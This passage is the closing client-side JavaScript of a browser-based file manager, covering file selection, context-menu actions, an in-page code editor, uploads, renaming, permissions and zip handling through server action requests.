    sep.className = 'bc-sep';
    sep.textContent = '/';
    bc.appendChild(sep);

    const seg = document.createElement('span');
    const isLast = idx === parts.length - 1;
    seg.className = 'bc-seg' + (isLast ? ' current' : '');
    seg.textContent = part;
    if (!isLast) {
      const target = build;
      seg.onclick = () => fetchList(target);
    }
    bc.appendChild(seg);
  });

  // Scroll to end
  bc.scrollLeft = bc.scrollWidth;
}

/* ── SELECTION ──────────────────────────────────────────── */
function cardClick(e, el) {
  if (e.target.closest('button')) return;
  const path = el.dataset.path;
  const type = el.dataset.type;

  if (e.ctrlKey || e.metaKey) {
    if (selItems.has(path)) { selItems.delete(path); el.classList.remove('selected'); }
    else { selItems.add(path); el.classList.add('selected'); }
  } else if (e.shiftKey) {
    // simple: just toggle
    if (selItems.has(path)) { selItems.delete(path); el.classList.remove('selected'); }
    else { selItems.add(path); el.classList.add('selected'); }
  } else {
    // single tap: select
    clearSelection();
    selItems.add(path);
    el.classList.add('selected');
  }
  selectedItem = { path, type };
  updateSelBar();
}

function clearSelection() {
  selItems.clear();
  document.querySelectorAll('.file-card.selected,.file-list-table tbody tr.selected').forEach(el => el.classList.remove('selected'));
  updateSelBar();
}

function updateSelBar() {
  const bar = document.getElementById('selBar');
  if (selItems.size > 1) {
    document.getElementById('selCount').textContent = selItems.size + ' selected';
    bar.classList.add('visible');
  } else {
    bar.classList.remove('visible');
  }
}

function selAction(act) {
  selItems.forEach(path => {
    if (act === 'copy') postAction('copy_item', { target: path });
    else if (act === 'delete') postAction('delete', { target: path });
    else if (act === 'zip') postAction('zip', { target: path });
  });
  clearSelection();
}

/* ── VIEW TOGGLE ────────────────────────────────────────── */
function setView(mode) {
  viewMode = mode;
  document.getElementById('viewGrid').classList.toggle('active', mode === 'grid');
  document.getElementById('viewList').classList.toggle('active', mode === 'list');
  if (curData) render(curData);
}

/* ── CONTEXT MENU ───────────────────────────────────────── */
function openCtx(e, path, type) {
  e.preventDefault();
  e.stopPropagation();
  selectedItem = { path, type };
  const m = document.getElementById('ctxMenu');
  m.style.display = 'block';
  let x = e.clientX, y = e.clientY;
  if (x + 200 > window.innerWidth) x = window.innerWidth - 210;
  if (y + 320 > window.innerHeight) y = window.innerHeight - 330;
  m.style.left = x + 'px';
  m.style.top = y + 'px';
  document.getElementById('ctxUnzip').style.display = type === 'zip' ? 'block' : 'none';
}

document.addEventListener('click', () => document.getElementById('ctxMenu').style.display = 'none');

function ctxAction(act) {
  if (!selectedItem) return;
  const { path, type } = selectedItem;
  document.getElementById('ctxMenu').style.display = 'none';

  if (act === 'open') {
    if (type === 'dir') fetchList(path);
    else editFile(path, path.split('/').pop());
  } else if (act === 'delete') {
    document.getElementById('deleteItemName').textContent = path.split('/').pop();
    openModal('deleteModal');
    document.getElementById('deleteConfirmBtn').onclick = () => {
      closeModal('deleteModal');
      postAction('delete', { target: path });
    };
  } else if (act === 'rename') {
    showInput('Rename', 'Filename', path.split('/').pop(), val => postAction('rename', { target: path, name: val }));
  } else if (act === 'zip') {
    postAction('zip', { target: path });
  } else if (act === 'unzip') {
    postAction('unzip', { target: path });
  } else if (act === 'chmod') {
    showInput('Permissions', 'Octal mode (e.g. 0755)', '0755', val => postAction('chmod', { target: path, perms: val }));
  } else if (act === 'copy') {
    postAction('copy_item', { target: path });
    showClipboard('Copied', path.split('/').pop());
  } else if (act === 'cut') {
    postAction('cut_item', { target: path });
    showClipboard('Cut', path.split('/').pop());
  } else if (act === 'download') {
    window.location.href = '?download=' + encodeURIComponent(path);
  }
}

/* ── CLIPBOARD ──────────────────────────────────────────── */
function showClipboard(type, name) {
  document.getElementById('clipType').textContent = type;
  document.getElementById('clipName').textContent = name;
  document.getElementById('clipboardBar').classList.add('visible');
}
function clearClipboard() {
  document.getElementById('clipboardBar').classList.remove('visible');
}
function pasteItem() {
  postAction('paste_item', {});
  clearClipboard();
}

/* ── EDITOR ─────────────────────────────────────────────── */
async function editFile(path, name) {
  const fd = new FormData(); fd.append('target', path);
  const r = await fetch('?action=read', { method:'POST', body:fd });
  const d = await r.json();
  if (d.status === 'success') {
    selectedItem = { path, name };
    document.getElementById('editFileName').textContent = name;
    document.getElementById('editorDot').classList.add('hidden');
    editor.setValue(d.data);
    editor.clearSelection();
    const ext = name.split('.').pop().toLowerCase();
    const modeMap = { js:'javascript', css:'css', html:'html', php:'php', json:'json', md:'markdown', py:'python', sh:'sh', txt:'text', sql:'sql', xml:'xml', yaml:'yaml', yml:'yaml' };
    const mode = modeMap[ext] || 'text';
    editor.session.setMode('ace/mode/' + mode);
    document.getElementById('editorLang').textContent = ext.toUpperCase();
    const lines = editor.session.getLength();
    document.getElementById('editorLines').textContent = lines + ' line' + (lines!==1?'s':'');
    document.getElementById('editorModal').classList.remove('hidden');
    setTimeout(() => editor.focus(), 100);
  } else toast(d.msg, 'err');
}

async function saveFile() {
  const fd = new FormData();
  fd.append('target', selectedItem.path);
  fd.append('content', editor.getValue());
  const r = await fetch('?action=save', { method:'POST', body:fd });
  const d = await r.json();
  if (d.status === 'success') {
    toast('Saved successfully', 'ok');
    document.getElementById('editorDot').classList.add('hidden');
  } else toast(d.msg, 'err');
}

function closeEditor() {
  document.getElementById('editorModal').classList.add('hidden');
}

/* ── ACTIONS ────────────────────────────────────────────── */
async function postAction(act, data) {
  const fd = new FormData();
  for (const k in data) fd.append(k, data[k]);
  if (!data.path) fd.append('path', curPath);
  try {
    const r = await fetch('?action=' + act, { method:'POST', body:fd });
    const d = await r.json();
    if (d.status === 'success') toast(d.msg, 'ok');
    else toast(d.msg, 'err');
    fetchList(curPath, false);
  } catch(e) { toast('Request failed', 'err'); }
}

/* ── UPLOAD ─────────────────────────────────────────────── */
function openUploadModal() {
  pendingUploadFiles = null;
  document.getElementById('uploadFileList').innerHTML = '';
  document.getElementById('uploadConfirmBtn').disabled = true;
  openModal('uploadModal');
  const dz = document.getElementById('dropZone');
  dz.onclick = () => document.getElementById('fileInput').click();
  dz.ondragover = e => { e.preventDefault(); dz.classList.add('drag-over'); };
  dz.ondragleave = () => dz.classList.remove('drag-over');
  dz.ondrop = e => {
    e.preventDefault();
    dz.classList.remove('drag-over');
    prepUpload(e.dataTransfer.files);
  };
}

function handleUpload(files) { prepUpload(files); }

function prepUpload(files) {
  if (!files.length) return;
  pendingUploadFiles = files;
  document.getElementById('uploadConfirmBtn').disabled = false;
  const list = document.getElementById('uploadFileList');
  list.innerHTML = '';
  Array.from(files).forEach(f => {
    const size = f.size > 1024*1024 ? (f.size/1024/1024).toFixed(1)+'MB' : (f.size/1024).toFixed(0)+'KB';
    list.innerHTML += `<div class="upload-file-item">
      <div class="upload-file-name">${escHtml(f.name)}</div>
      <span class="upload-file-size">${size}</span>
    </div>`;
  });
}

async function doUpload() {
  if (!pendingUploadFiles) return;
  const fd = new FormData();
  fd.append('path', curPath);
  Array.from(pendingUploadFiles).forEach(f => fd.append('files[]', f));
  document.getElementById('uploadConfirmBtn').disabled = true;
  document.getElementById('uploadConfirmBtn').textContent = 'Uploading…';
  try {
    await fetch('?action=upload', { method:'POST', body:fd });
    toast(pendingUploadFiles.length + ' file(s) uploaded', 'ok');
    closeModal('uploadModal');
    fetchList(curPath, false);
  } catch(e) { toast('Upload failed', 'err'); }
  document.getElementById('uploadConfirmBtn').textContent = 'Upload';
  document.getElementById('uploadConfirmBtn').disabled = false;
}

/* ── CREATE ─────────────────────────────────────────────── */
function showCreateFolder() {
  showInput('New Folder', 'Folder name', 'new-folder', val => postAction('create_folder', { name: val }));
}
function showCreateFile() {
  showInput('New File', 'Filename (e.g. index.php)', 'index.php', val => postAction('create_file', { name: val }));
}

/* ── INPUT MODAL ────────────────────────────────────────── */
function showInput(title, label, def, cb) {
  document.getElementById('inputModalTitle').textContent = title;
  document.getElementById('inputModalLabel').textContent = label;
  const inp = document.getElementById('inputVal');
  inp.value = def;
  openModal('inputModal');
  setTimeout(() => { inp.focus(); inp.select(); }, 80);
  document.getElementById('inputConfirmBtn').onclick = () => {
    if (inp.value.trim()) {
      cb(inp.value.trim());
      closeModal('inputModal');
    }
  };
}

/* ── FAB ────────────────────────────────────────────────── */
function toggleFab() {
  fabOpen = !fabOpen;
  document.getElementById('fabMain').classList.toggle('open', fabOpen);
  document.getElementById('fabMenu').classList.toggle('open', fabOpen);
}

document.addEventListener('click', e => {
  if (fabOpen && !e.target.closest('.fab-wrap')) {
    fabOpen = false;
    document.getElementById('fabMain').classList.remove('open');
    document.getElementById('fabMenu').classList.remove('open');
  }
});

/* ── MODALS ─────────────────────────────────────────────── */
function openModal(id) { document.getElementById(id).classList.remove('hidden'); }
function closeModal(id) { document.getElementById(id).classList.add('hidden'); }

document.querySelectorAll('.modal-backdrop').forEach(bd => {
  bd.addEventListener('click', e => { if (e.target === bd) bd.classList.add('hidden'); });
});

/* ── REFRESH ────────────────────────────────────────────── */
function refresh() {
  const icon = document.getElementById('refreshIcon');
  icon.style.transition = 'transform .6s ease';
  icon.style.transform = 'rotate(360deg)';
  setTimeout(() => { icon.style.transition = 'none'; icon.style.transform = 'none'; }, 700);
  fetchList(curPath, false);
}

/* ── SEARCH FILTER ──────────────────────────────────────── */
document.getElementById('searchInput').addEventListener('input', () => {
  if (curData) render(curData);
});

/* ── TOASTS ─────────────────────────────────────────────── */
const toastIcons = {
  ok:  `<svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M2 6L5 9L10 3" stroke="#4ADE80" stroke-width="1.5" stroke-linecap="round"/></svg>`,
  err: `<svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M2 2L10 10M10 2L2 10" stroke="#F87171" stroke-width="1.5" stroke-linecap="round"/></svg>`,
  info:`<svg width="12" height="12" viewBox="0 0 12 12" fill="none"><circle cx="6" cy="6" r="5" stroke="#60A5FA" stroke-width="1.25"/><path d="M6 5V9M6 3.5V3" stroke="#60A5FA" stroke-width="1.3" stroke-linecap="round"/></svg>`,
  warn:`<svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M6 1L11 10H1L6 1Z" stroke="#FBBF24" stroke-width="1.25" stroke-linejoin="round"/><path d="M6 4.5V7" stroke="#FBBF24" stroke-width="1.3" stroke-linecap="round"/><circle cx="6" cy="8.5" r=".5" fill="#FBBF24"/></svg>`,
};

function toast(msg, type='info') {
  const el = document.createElement('div');
  el.className = `toast ${type}`;
  el.innerHTML = `<span class="toast-icon">${toastIcons[type]||toastIcons.info}</span><span class="toast-msg">${escHtml(msg)}</span>`;
  const wrap = document.getElementById('toastWrap');
  wrap.appendChild(el);
  setTimeout(() => { el.classList.add('exiting'); setTimeout(() => el.remove(), 350); }, 2600);
}

/* ── KEYBOARD SHORTCUTS ─────────────────────────────────── */
document.addEventListener('keydown', e => {
  const tag = document.activeElement.tagName;
  if (['INPUT','TEXTAREA'].includes(tag)) return;
  if (e.key === 'r' || e.key === 'R') { e.preventDefault(); refresh(); }
  if (e.key === 'u' || e.key === 'U') { e.preventDefault(); openUploadModal(); }
  if (e.key === '/') { e.preventDefault(); document.getElementById('searchInput').focus(); }
  if (e.key === 'Escape') {
    closeModal('uploadModal'); closeModal('inputModal'); closeModal('deleteModal');
    if (!document.getElementById('editorModal').classList.contains('hidden')) closeEditor();
    clearSelection();
  }
  if ((e.ctrlKey||e.metaKey) && e.key==='s' && !document.getElementById('editorModal').classList.contains('hidden')) {
    e.preventDefault(); saveFile();
  }
  if ((e.ctrlKey||e.metaKey) && e.key==='a') {
    e.preventDefault();
    if (curData) {
      [...curData.folders,...curData.files].forEach(i => {
        selItems.add(i.path);
        document.querySelectorAll(`[data-path="${CSS.escape(i.path)}"]`).forEach(el => el.classList.add('selected'));
      });
      updateSelBar();
    }
  }
});

/* ── BROWSER BACK/FWD ───────────────────────────────────── */
window.addEventListener('popstate', e => {
  if (e.state?.path) fetchList(e.state.path, false);
});

/* ── UTILS ──────────────────────────────────────────────── */
function esc(s)    { return (s+'').replace(/\\/g,'\\\\').replace(/'/g,"\\'"); }
function escHtml(s){ return (s+'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }

/* ── BOOT ───────────────────────────────────────────────── */
fetchList(curPath);
</script>
</body>
</html>